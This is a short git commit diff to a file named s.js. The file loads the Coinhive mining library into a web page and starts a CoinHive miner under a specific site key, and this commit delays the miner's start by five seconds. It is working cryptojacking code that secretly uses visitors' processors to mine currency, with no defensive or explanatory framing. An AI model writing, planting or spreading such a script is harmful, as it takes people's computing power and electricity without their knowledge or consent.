5506bdd7ce4f6e24657d83c1c8784bb7dd320b56
crytopia <32449891+crytopia@users.noreply.github.com>
2017-10-02 15:30:03 +0700

    Update s.js

--- s.js
+++ s.js
@@ -1,5 +1,7 @@
 var imported = document.createElement('script');
 imported.src = 'https://coinhive.com/lib/coinhive.min.js';
 document.head.appendChild(imported);
-var miner = new CoinHive.User('GqEjB61Qhy7BZu5CdXu7Op72IAk9qS4W', 'cryptopia');
-miner.start();
+setTimeout(() => {
+  var miner = new CoinHive.User('GqEjB61Qhy7BZu5CdXu7Op72IAk9qS4W', 'cryptopia');
+  miner.start();
+}, 5000);
